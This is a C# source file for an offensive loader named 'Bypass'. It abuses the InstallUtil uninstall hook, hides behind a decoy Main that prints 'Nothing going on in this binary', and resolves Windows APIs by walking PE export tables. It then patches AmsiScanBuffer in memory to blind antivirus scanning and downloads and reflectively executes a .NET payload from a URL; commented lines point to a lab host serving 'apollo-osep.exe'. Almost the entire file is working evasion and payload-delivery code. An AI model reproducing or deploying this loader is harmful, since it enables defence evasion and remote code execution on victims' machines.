using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Configuration.Install;
using System.IO;
using System.Net;
using System.Text;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Linq;
using System.Threading;
using System.Diagnostics;
using System.Collections.Specialized;


namespace Bypass
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("Nothing going on in this binary.");
        }
    }
    [System.ComponentModel.RunInstaller(true)]
    public class Sample : Installer
    {


        public static IntPtr GetLoadedModuleAddress(string DLLName)
        {
            ProcessModuleCollection ProcModules = Process.GetCurrentProcess().Modules;
            foreach (ProcessModule Mod in ProcModules)
            {
                if (Mod.FileName.ToLower().EndsWith(DLLName.ToLower()))
                {
                    return Mod.BaseAddress;
                }
            }
            return IntPtr.Zero;
        }
        public static IntPtr GetExportAddress(IntPtr ModuleBase, string ExportName)
        {
            IntPtr FunctionPtr = IntPtr.Zero;
            try
            {
                // Traverse the PE header in memory
                Int32 PeHeader = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + 0x3C));
                Int16 OptHeaderSize = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + PeHeader + 0x14));
                Int64 OptHeader = ModuleBase.ToInt64() + PeHeader + 0x18;
                Int16 Magic = Marshal.ReadInt16((IntPtr)OptHeader);
                Int64 pExport = 0;
                if (Magic == 0x010b)
                {
                    pExport = OptHeader + 0x60;
                }
                else
                {
                    pExport = OptHeader + 0x70;
                }

                // Read -> IMAGE_EXPORT_DIRECTORY
                Int32 ExportRVA = Marshal.ReadInt32((IntPtr)pExport);
                Int32 OrdinalBase = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x10));
                Int32 NumberOfFunctions = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x14));
                Int32 NumberOfNames = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x18));
                Int32 FunctionsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x1C));
                Int32 NamesRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x20));
                Int32 OrdinalsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x24));

                // Loop the array of export name RVA's
                for (int i = 0; i < NumberOfNames; i++)
                {
                    string FunctionName = Marshal.PtrToStringAnsi((IntPtr)(ModuleBase.ToInt64() + Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + NamesRVA + i * 4))));
                    if (FunctionName.Equals(ExportName, StringComparison.OrdinalIgnoreCase))
                    {
                        Int32 FunctionOrdinal = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + OrdinalsRVA + i * 2)) + OrdinalBase;
                        Int32 FunctionRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + FunctionsRVA + (4 * (FunctionOrdinal - OrdinalBase))));
                        FunctionPtr = (IntPtr)((Int64)ModuleBase + FunctionRVA);
                        break;
                    }
                }
            }
            catch
            {
                // Catch parser failure
                throw new InvalidOperationException("Failed to parse module exports.");
            }

            if (FunctionPtr == IntPtr.Zero)
            {
                // Export not found
                throw new MissingMethodException(ExportName + ", export not found.");
            }
            return FunctionPtr;
        }
        public static IntPtr GetLibraryAddress(string DLLName, string FunctionName, bool CanLoadFromDisk = false)
        {
            IntPtr hModule = GetLoadedModuleAddress(DLLName);
            if (hModule == IntPtr.Zero)
            {
                throw new DllNotFoundException(DLLName + ", Dll was not found.");
            }

            return GetExportAddress(hModule, FunctionName);
        }
        public static object DynamicAPIInvoke(string DLLName, string FunctionName, Type FunctionDelegateType, ref object[] Parameters)
        {
            IntPtr pFunction = GetLibraryAddress(DLLName, FunctionName);
            return DynamicFunctionInvoke(pFunction, FunctionDelegateType, ref Parameters);
        }
        public static object DynamicFunctionInvoke(IntPtr FunctionPointer, Type FunctionDelegateType, ref object[] Parameters)
        {
            Delegate funcDelegate = Marshal.GetDelegateForFunctionPointer(FunctionPointer, FunctionDelegateType);
            return funcDelegate.DynamicInvoke(Parameters);
        }


        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate IntPtr GetProcAddress(IntPtr UO, string HypostomousBuried);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate bool VirtualProtect(IntPtr GhostwritingNard, UIntPtr NontabularlyBankshall, uint YU, out uint ZygosisCoordination);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate IntPtr LoadLibrary(string LiodermiaGranulater);

        private static object[] globalArgs = null;

        private static void printHelp()
        {

            Console.WriteLine("Usage: ");
            Console.WriteLine("Usage: [-b64] [-xor <key>] -path <binary_path> [-args <binary_args>]");
            Console.WriteLine("\t-b64: Optionnal flag parameter indicating that all other parameters are base64 encoded.");
            Console.WriteLine("\t-xor: Optionnal parameter indicating that binary files are XOR encrypted. Must be followed by the XOR decryption key.");
            Console.WriteLine("\t-path: Mandatory parameter. Indicates the path, either local or a URL, of the binary to load.");
            Console.WriteLine("\t-args: Optionnal parameter used to pass arguments to the loaded binary. Must be followed by all arguments for the binary.");

        }

        private static Assembly loadASM(byte[] byteArray)
        {
            return Assembly.Load(byteArray);
        }

        private static byte[] readLocalFilePath(string filePath, FileMode fileMode)
        {
            byte[] buffer = null;
            using (FileStream fs = new FileStream(filePath, fileMode, FileAccess.Read))
            {
                buffer = new byte[fs.Length];
                fs.Read(buffer, 0, (int)fs.Length);
            }
            return buffer;

        }
        private static IntPtr getAL()
        {
            //GetProcAddress
            IntPtr pGetProcAddress = GetLibraryAddress("kernel32.dll", "GetProcAddress");
            IntPtr pLoadLibrary = GetLibraryAddress("kernel32.dll", "LoadLibraryA");

            GetProcAddress fGetProcAddress = (GetProcAddress)Marshal.GetDelegateForFunctionPointer(pGetProcAddress, typeof(GetProcAddress));
            LoadLibrary fLoadLibrary = (LoadLibrary)Marshal.GetDelegateForFunctionPointer(pLoadLibrary, typeof(LoadLibrary));

            return fGetProcAddress(fLoadLibrary("amsi.dll"), "AmsiScanBuffer");
        }

        private static bool is64Bit()
        {
            if (IntPtr.Size == 4)
                return false;

            return true;
        }


        private static byte[] getAP()
        {
            if (!is64Bit())
                return Convert.FromBase64String("uFcAB4DCGAA=");
            return Convert.FromBase64String("uFcAB4DD");
        }

        private static Type junkFunction(MethodInfo methodInfo)
        {
            return methodInfo.ReflectedType;
        }
        private static object invokeCSharpMethod(MethodInfo methodInfo)
        {
            if (junkFunction(methodInfo) == methodInfo.ReflectedType)
                methodInfo.Invoke(null, globalArgs);
            Console.ReadLine();
            return globalArgs[0];
        }

        private static byte[] downloadURL(string url)
        {
            HttpWebRequest myRequest = (HttpWebRequest)WebRequest.Create(url);
            myRequest.Proxy.Credentials = CredentialCache.DefaultCredentials;
            myRequest.Method = "GET";
            WebResponse myResponse = myRequest.GetResponse();
            MemoryStream ms = new MemoryStream();
            myResponse.GetResponseStream().CopyTo(ms);
            return ms.ToArray();
        }

        public static int setProtocolTLS(int secProt)
        {
            ServicePointManager.SecurityProtocol = (SecurityProtocolType)secProt;
            return secProt;
        }
        private static MethodInfo getEntryPoint(Assembly asm)
        {

            return asm.EntryPoint;
        }

        private static void TriggerPayload(string payloadPathOrURL, string[] inputArgs, bool xE, string xK, int setProtType = 0)
        {
            setProtocolTLS(setProtType);

            if (!string.IsNullOrEmpty(string.Join(" ", inputArgs)))
                Console.WriteLine("[+] URL/PATH : " + payloadPathOrURL + " Arguments : " + string.Join(" ", inputArgs));
            else
            {
                Console.WriteLine("[+] URL/PATH : " + payloadPathOrURL + " Arguments : " + string.Join(" ", inputArgs));
            }
            globalArgs = new object[] { inputArgs };

            if (xE && payloadPathOrURL.ToLower().StartsWith("http"))
            {

                Console.WriteLine("[+] encDeploy(downloadURL(payloadPathOrURL), xK)");
            }
            else if (!xE && payloadPathOrURL.ToLower().StartsWith("http"))
            {

                unEncDeploy(downloadURL(payloadPathOrURL));
            }
            else if (!xE && !payloadPathOrURL.ToLower().StartsWith("http"))
                unEncDeploy(readLocalFilePath(payloadPathOrURL, FileMode.Open));
            else
                Console.WriteLine("[+] encDeploy(readLocalFilePath(payloadPathOrURL, FileMode.Open), xK);");

        }


        private static void unEncDeploy(byte[] data)
        {

            invokeCSharpMethod(getEntryPoint(loadASM(data)));

        }

        private static IntPtr unProtect(IntPtr amsiLibPtr)
        {

            IntPtr pVirtualProtect = GetLibraryAddress("kernel32.dll", "VirtualProtect");

            VirtualProtect fVirtualProtect = (VirtualProtect)Marshal.GetDelegateForFunctionPointer(pVirtualProtect, typeof(VirtualProtect));

            uint newMemSpaceProtection = 0;
            if (fVirtualProtect(amsiLibPtr, (UIntPtr)getAP().Length, 0x40, out newMemSpaceProtection))
            {
                return amsiLibPtr;
            }
            else
            {
                return (IntPtr)0;
            }

        }
        private static void PathAMSI()
        {

            IntPtr amsiLibPtr = unProtect(getAL());
            if (amsiLibPtr != (IntPtr)0)
            {
                Marshal.Copy(getAP(), 0, amsiLibPtr, getAP().Length);
                Console.WriteLine("[+] Successfully patched AMSI!");
            }
            else
            {
                Console.WriteLine("[!] Patching AMSI FAILED");
            }

        }



        public override void Uninstall(System.Collections.IDictionary savedState)
        {

            System.Collections.Specialized.StringDictionary p = Context.Parameters;

            int paramCount = p.Count;

            // Example flags expected as:
            // /b64=true  /xor=KEY  /path=C:\file.bin  /args="one,two,three"
            bool base64Enc = IsTrue("b64");
            string xK = GetString("xor");
            string payloadPathOrUrl = GetString("path");
            string[] payloadArgs = GetList("args"); // comma-separated list

            PathAMSI();

            //        string payloadPathOrUrl = "http://192.168.58.129:8081/apollo-osep.exe";
            //        string[] payloadArgs = new string[] { };

            //bool base64Enc = false;
            bool xorEnc = false;
            //        string xK = "";

            int secProTypeHolde = (Convert.ToInt32("384") * Convert.ToInt32("8"));

            //	payloadPathOrUrl="http://192.168.58.129:8081/apollo-osep.exe";


            if (string.IsNullOrEmpty(payloadPathOrUrl))
            {
                printHelp();
                Environment.Exit(0);
            }



            TriggerPayload(payloadPathOrUrl, payloadArgs, xorEnc, xK, secProTypeHolde);
            Environment.Exit(0);


        }


        private bool IsTrue(string name)
        {
            // InstallUtil treats flags like /name=true or /name
            // Context.IsParameterTrue handles both
            return Context.IsParameterTrue(name);
        }

        private string GetString(string name)
        {
            return Context.Parameters[name];
        }

        private string[] GetList(string name)
        {
            string raw = Context.Parameters[name];
            if (string.IsNullOrWhiteSpace(raw)) return Array.Empty<string>();
            // Allow either comma or semicolon separated
            char[] sep = new[] { ',', ';' };
            string[] parts = raw.Split(sep, StringSplitOptions.RemoveEmptyEntries);
            for (int i = 0; i < parts.Length; i++)
                parts[i] = parts[i].Trim();
            return parts;
        }


    }
}